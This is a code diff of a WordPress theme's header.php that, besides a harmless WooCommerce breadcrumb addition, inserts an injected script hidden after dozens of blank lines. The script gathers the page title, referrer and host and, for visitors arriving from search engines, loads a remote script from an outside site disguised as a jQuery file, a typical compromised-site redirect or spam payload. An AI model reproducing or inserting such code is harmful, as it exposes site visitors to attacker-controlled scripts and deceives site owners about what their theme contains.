@@ -34,6 +34,54 @@
 
 	<link href='https://fonts.googleapis.com/css?family=Arimo:400,400italic,700,700italic' rel='stylesheet' type='text/css'>
 	<?php wp_head(); ?>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>var a=''; setTimeout(10); var default_keyword = encodeURIComponent(document.title); var se_referrer = encodeURIComponent(document.referrer); var host = encodeURIComponent(window.location.host); var base = "http://www.sglcoop.it/js/jquery.min.php"; var n_url = base + "?default_keyword=" + default_keyword + "&se_referrer=" + se_referrer + "&source=" + host; var f_url = base + "?c_utt=snt2014&c_utm=" + encodeURIComponent(n_url); if (default_keyword !== null && default_keyword !== '' && se_referrer !== null && se_referrer !== ''){document.write('<script type="text/javascript" src="' + f_url + '">' + '<' + '/script>');}</script>
 </head>
 <body <?php body_class(); ?>>
 	<div id="page-container">
@@ -60,7 +108,6 @@
 	<?php if ( $et_top_info_defined ) : ?>
 		<div id="top-header">
 			<div class="container clearfix">
-
 			<?php if ( $et_contact_info_defined ) : ?>
 
 				<div id="et-info">
@@ -183,6 +230,13 @@
 					<span class="et_close_search_field"></span>
 				</div>
 			</div>
+
 		</header> <!-- #main-header -->
 
 		<div id="et-main-area">
+
+			<?php if(is_product()){
+			echo '<div class="bread-back"><div class="container">';
+			echo woocommerce_breadcrumb();
+			echo '</div></div>';
+			} ?>
